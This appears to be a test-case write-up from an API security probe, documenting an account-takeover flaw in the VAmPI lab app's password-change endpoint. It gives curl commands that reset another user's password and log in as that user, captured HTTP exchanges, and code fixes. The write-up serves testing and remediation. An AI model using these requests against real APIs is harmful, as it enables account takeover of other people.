# API1-BOLA-02: Account takeover by rewriting another user's password

| | |
|---|---|
| **OWASP** | [API1:2023 Broken Object Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/) |
| **CWE** | [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html) |
| **Severity** | Critical |
| **Validated against** | VAmPI at `f16052dc`, `PUT /users/v1/{username}/password` |
| **Runnable** | `python -m authzprobe.probe` case `API1-BOLA-02` |

## Purpose

The write-side version of BOLA-01, and the reason object-level authorization is
rated critical rather than merely high. The endpoint takes the target account
from the URL and the new password from the body, and never checks that the two
have anything to do with the caller.

Worth testing separately from the read case even when both live in the same
API. Teams frequently scope reads correctly and forget writes, because the read
path gets exercised by the UI on every page load and the write path only on a
settings screen nobody fuzzes.

## Identification

1. Find state-changing endpoints that name their target in the path or body:
   `/users/{id}/password`, `/users/{id}/email`, `/accounts/{id}/close`.
2. Check whether the handler resolves the subject from the credential or from
   the request. The giveaway in a code review is a handler that accepts a
   `username` or `id` parameter *and* validates a token, then uses the
   parameter rather than the token's claim.
3. Note that the endpoint may legitimately exist for administrators. Test as a
   peer, not as an admin.
4. **Prove the write landed.** A `2xx` on a password change is not evidence by
   itself. The only proof is authenticating afterwards with the value you set.

   This is not a theoretical caution. VAmPI's *fixed* build returns `204` from
   this same endpoint, because it accepts the request and writes to the
   caller's own account instead of the one named in the path. Both builds
   answer `204`; only the follow-up login tells them apart. An earlier version
   of the probe compared status codes alone and reported a critical account
   takeover against code that was correct.

   Worse, the obvious confirmation is also unusable here: VAmPI returns `200`
   on a *failed* login as well, so the confirmation has to match on response
   content. The case definition does that with `expect_contains: auth_token`.
   Two layers of status codes that look like success and mean nothing, in one
   endpoint. Assume nothing from a status code on a write.

## Implementation

As `name1`, set `name2`'s password:

```bash
TOKEN=$(curl -s -X POST http://127.0.0.1:5000/users/v1/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"name1","password":"pass1"}' | jq -r .auth_token)

curl -i -X PUT http://127.0.0.1:5000/users/v1/name2/password \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"password":"pwned-by-name1"}'
```

Then prove the takeover by logging in as the victim:

```bash
curl -s -X POST http://127.0.0.1:5000/users/v1/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"name2","password":"pwned-by-name1"}'
```

## Success criteria

Confirmed when the second command returns a valid session for an account the
tester never had credentials for. That is complete account takeover, and the
proof chain is two requests long.

Observed against VAmPI:

| Step | Result |
|---|---|
| `name1` writes `name2`'s password | `HTTP 204` |
| `name2` login with the new password | `HTTP 200` with `auth_token` |

Corroborating evidence, from the same run: the `/users/v1/_debug` capture taken
afterwards shows `name2`'s stored password as the value the probe set, which
independently confirms the write reached the database.

Not confirmed if the write returns `2xx` but the victim's old password still
works. In that case the endpoint is ignoring the body, which is a different
bug, and the finding is unexploitable as written.

## Original and modified exchange

Verbatim from `captures/vampi-2026-10-21.md`.

**Original** — `name2` changing their own password. Legitimate.

```http
PUT /users/v1/name2/password HTTP/1.1
Authorization: Bearer <name2 token>
Content-Type: application/json

{ "password": "probe-set-this" }
```

```http
HTTP/1.1 204
```

**Modified** — the same request with `name1`'s token. Only the credential changed.

```http
PUT /users/v1/name2/password HTTP/1.1
Authorization: Bearer <name1 token>
Content-Type: application/json

{ "password": "probe-set-this" }
```

```http
HTTP/1.1 204
```

**Control** — unauthenticated, confirming authentication is enforced:

```http
PUT /users/v1/name2/password HTTP/1.1
Content-Type: application/json

{ "password": "probe-set-this" }
```

```http
HTTP/1.1 401

{"detail": "No authorization token provided", "status": 401, "title": "Unauthorized"}
```

## Remediation

A password change should not accept a subject at all. The account is whoever
holds the credential:

```python
# Vulnerable: subject comes from the URL
user = User.query.filter_by(username=username).first()
user.password = request_data["password"]

# Fixed: subject comes from the token, path parameter ignored
user = User.query.filter_by(username=claims["sub"]).first()
user.password = hash_password(request_data["password"])
```

For this endpoint specifically:

- Drop the `{username}` segment. An endpoint that cannot name a victim cannot
  be abused to target one.
- Require the current password in the body, so a stolen session alone is not
  enough to lock the owner out.
- Hash the stored password. VAmPI stores it in cleartext, which is why
  `/users/v1/_debug` could be used as corroboration above. That is
  [CWE-256](https://cwe.mitre.org/data/definitions/256.html) and out of scope
  for this case, but it is the reason the impact here is total rather than
  merely serious.
- Invalidate existing sessions on password change, and notify the account owner
  out of band.

Where an administrative reset genuinely is required, make it a separate
endpoint behind a role check, and audit-log it.

## Notes

Detectable statically. The same Semgrep rule referenced in BOLA-01 flags this
at `users.py:187`, where upstream's own source comment reads
"Unauthorized update of password of another user".
